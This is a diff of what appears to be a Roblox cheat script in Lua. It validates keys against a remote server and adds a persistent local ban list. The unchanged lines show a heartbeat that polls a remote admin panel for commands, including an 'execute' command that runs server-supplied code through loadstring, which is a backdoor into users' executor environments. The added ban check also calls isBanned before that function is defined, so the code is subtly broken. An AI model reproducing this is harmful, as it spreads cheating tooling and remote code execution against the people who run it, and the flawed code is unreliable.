@@ -15,10 +15,19 @@ while not Players.LocalPlayer do
 end
 local LocalPlayer = Players.LocalPlayer
 
+-- Immediately enforce local bans if present
+if isBanned(LocalPlayer.UserId) then
+    debugPrint("Local ban detected for user", tostring(LocalPlayer.UserId), "kicking")
+    pcall(function()
+        if typeof(LocalPlayer.Kick) == "function" then LocalPlayer:Kick("You are banned from using this script.") end
+    end)
+end
+
 local UI, Window, SettingsTab
 
 local KEY_FILE = "yousuck_key.txt"
 local SETTINGS_FILE = "yousuck_settings.json"
+local BAN_FILE = "yousuck_bans.json"
 local VALIDATION_URL = "https://yoursuck.vercel.app/api/verify-key"
 local CLIENT_HEARTBEAT_URL = "https://yoursuck.vercel.app/api/clients"
 local heartbeatStarted = false
@@ -149,6 +158,35 @@ local function saveSettings(settings)
     end
 end
 
+local function readBanList()
+    if not hasFileReadApi() then return {} end
+    local ok, content = readFile(BAN_FILE)
+    if not ok or type(content) ~= "string" or content == "" then return {} end
+    local decodedOk, t = pcall(function() return HttpService:JSONDecode(content) end)
+    if decodedOk and type(t) == "table" then return t end
+    return {}
+end
+
+local function addBan(id)
+    if not hasFileWriteApi() then debugPrint("Ban: no file write API available") return false end
+    local list = readBanList()
+    id = tostring(id or "")
+    for _, v in ipairs(list) do if tostring(v) == id then return true end end
+    table.insert(list, id)
+    local ok, encoded = pcall(function() return HttpService:JSONEncode(list) end)
+    if not ok or type(encoded) ~= "string" then debugPrint("Ban: encode failed") return false end
+    local wrote = writeFile(BAN_FILE, encoded)
+    if not wrote then debugPrint("Ban: writefile failed") return false end
+    return true
+end
+
+local function isBanned(id)
+    local list = readBanList()
+    id = tostring(id or "")
+    for _, v in ipairs(list) do if tostring(v) == id then return true end end
+    return false
+end
+
 local function getExecutorName()
     if type(syn) == "table" then return "Synapse" end
     if type(secure_load) == "function" then return "Sentinel" end
@@ -239,9 +277,11 @@ local function startClientHeartbeat()
                                     end
                                 elseif cmd.type == "ban" then
                                     debugPrint("CommandPoll: ban command received")
-                                    if LocalPlayer and typeof(LocalPlayer.Kick) == "function" then
-                                        LocalPlayer:Kick("Banned by admin panel")
-                                    end
+                                        -- persist local ban and then kick
+                                        pcall(function() addBan(LocalPlayer.UserId) end)
+                                        if LocalPlayer and typeof(LocalPlayer.Kick) == "function" then
+                                            LocalPlayer:Kick("Banned by admin panel")
+                                        end
                                 elseif cmd.type == "execute" and type(cmd.script) == "string" and cmd.script ~= "" then
                                     debugPrint("CommandPoll: executing script")
                                     local fnOk, fn = pcall(function() return loadstring(cmd.script) end)
